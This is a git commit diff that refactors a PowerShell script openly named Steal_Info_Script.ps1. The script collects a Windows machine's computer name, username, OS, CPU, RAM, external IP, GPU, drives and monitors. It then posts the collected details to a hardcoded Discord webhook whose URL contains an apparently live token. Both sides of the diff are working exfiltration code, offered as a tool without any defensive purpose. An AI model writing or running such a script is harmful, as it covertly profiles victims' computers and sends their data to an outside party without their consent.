0e4def337986ea95bb8644686b48fb41297b702a
yimang <lucasbbtung@gmail.com>
2024-10-22 20:05:16 +0800

    Update Steal_Info_Script.ps1

--- Steal_Info_Script.ps1
+++ Steal_Info_Script.ps1
@@ -1,57 +1,53 @@
 $webhookUrl = "https://discord.com/api/webhooks/1297857116102721577/IM6TnftAs1B8vmh__zSG7tmnqciJbx3KnCVZc2-mSxYneRIP0U2N0uWXxTV4jTSoD9K-"
 
-$externalIp = Invoke-RestMethod -Uri "https://api.ipify.org?format=json"
-$gpuInfo = Get-WmiObject -Class Win32_VideoController | ForEach-Object {
-    @{
-        Name = $_.Name
-        AdapterRAM = [math]::round($_.AdapterRAM / 1MB, 2)
-        DriverVersion = $_.DriverVersion
-    }
-}
+$externalIp = (Invoke-RestMethod -Uri "https://api.ipify.org?format=json").IP
 $deviceInfo = @{
     ComputerName = $env:COMPUTERNAME
     Username = $env:USERNAME
     OS = (Get-WmiObject -Class Win32_OperatingSystem).Caption
     CPU = (Get-WmiObject -Class Win32_Processor).Name
-    RamGB = [math]::round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
-    IPAddress = $externalIp.IP
-    GPU = $gpuInfo
+    RAM = [math]::round((Get-WmiObject -Class Win32_ComputerSystem).TotalPhysicalMemory / 1GB, 2)
+    IP = $externalIp
+    GPU = Get-WmiObject -Class Win32_VideoController | ForEach-Object {
+        @{
+            Name = $_.Name
+            RAM = [math]::round($_.AdapterRAM / 1MB, 2)
+            DriverVersion = $_.DriverVersion
+        }
+    }
     HardDrives = Get-WmiObject -Class Win32_DiskDrive | ForEach-Object {
         @{
             Model = $_.Model
-            SizeGB = [math]::round($_.Size / 1GB, 2)
+            Size = [math]::round($_.Size / 1GB, 2)
         }
     }
     Monitors = Get-WmiObject -Class Win32_DesktopMonitor | ForEach-Object {
         @{
             Name = $_.Name
-            ScreenWidth = $_.ScreenWidth
-            ScreenHeight = $_.ScreenHeight
+            Resolution = "${($_.ScreenWidth)}x${($_.ScreenHeight)}"
         }
     }
 }
 $deviceInfoFormatted = "DEVICE INFO:`n" +
-                       "Computer Name: $($deviceInfo.ComputerName)`n" +
-                       "Username: $($deviceInfo.Username)`n" +
-                       "OS: $($deviceInfo.OS)`n" +
-                       "CPU: $($deviceInfo.CPU)`n" +
-                       "RAM (GB): $($deviceInfo.RamGB)`n" +
-                       "External IP: $($deviceInfo.IPAddress)`n" +
-                       "GPU:`n"
+    "Computer Name: $($deviceInfo.ComputerName)`n" +
+    "Username: $($deviceInfo.Username)`n" +
+    "OS: $($deviceInfo.OS)`n" +
+    "CPU: $($deviceInfo.CPU)`n" +
+    "RAM (GB): $($deviceInfo.RAM)`n" +
+    "External IP: $($deviceInfo.IP)`n" +
+    "GPU:`n"
 foreach ($gpu in $deviceInfo.GPU) {
-    $deviceInfoFormatted += "  - Name: $($gpu.Name), Adapter RAM (MB): $($gpu.AdapterRAM), Driver Version: $($gpu.DriverVersion)`n"
+    $deviceInfoFormatted += "  - Name: $($gpu.Name), RAM (MB): $($gpu.RAM), Driver: $($gpu.DriverVersion)`n"
 }
 $deviceInfoFormatted += "Hard Drives:`n"
 foreach ($drive in $deviceInfo.HardDrives) {
-    $deviceInfoFormatted += "  - Model: $($drive.Model), Size (GB): $($drive.SizeGB)`n"
+    $deviceInfoFormatted += "  - Model: $($drive.Model), Size (GB): $($drive.Size)`n"
 }
 $deviceInfoFormatted += "Monitors:`n"
 foreach ($monitor in $deviceInfo.Monitors) {
-    $deviceInfoFormatted += "  - Name: $($monitor.Name), Resolution: ${($monitor.ScreenWidth)}x${($monitor.ScreenHeight)}`n"
+    $deviceInfoFormatted += "  - Name: $($monitor.Name), Resolution: $($monitor.Resolution)`n"
 }
-$deviceInfoMessage = @{
-    content = $deviceInfoFormatted
-}
+$deviceInfoMessage = @{ content = $deviceInfoFormatted }
 $jsonMessage = $deviceInfoMessage | ConvertTo-Json
 $response = Invoke-RestMethod -Uri $webhookUrl -Method Post -Body $jsonMessage -ContentType "application/json"
 $response
